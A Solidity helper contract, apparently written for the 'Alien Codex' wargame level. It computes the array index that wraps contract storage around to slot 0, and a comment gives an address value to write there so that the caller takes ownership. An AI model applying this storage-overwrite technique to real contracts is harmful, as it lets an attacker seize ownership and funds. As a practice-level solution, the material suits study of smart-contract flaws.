// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AlienCodexAttacker{
    uint256 public constant MAX_UINT = 2**256 - 1;

    function getSlotNum()external pure returns(uint256){
        bytes32 arraySlotNum = keccak256(abi.encodePacked(uint256(1)));
        return MAX_UINT - uint256(arraySlotNum) + 1;
        //35707666377435648211887908874984608119992236509074197713628505308453184860938
        //to find the number that can loop to the slot[0]
        //0x000000000000000000000001 ab8483f64d9c6d1ecf9b849ae677dd3315835cb2
    }

}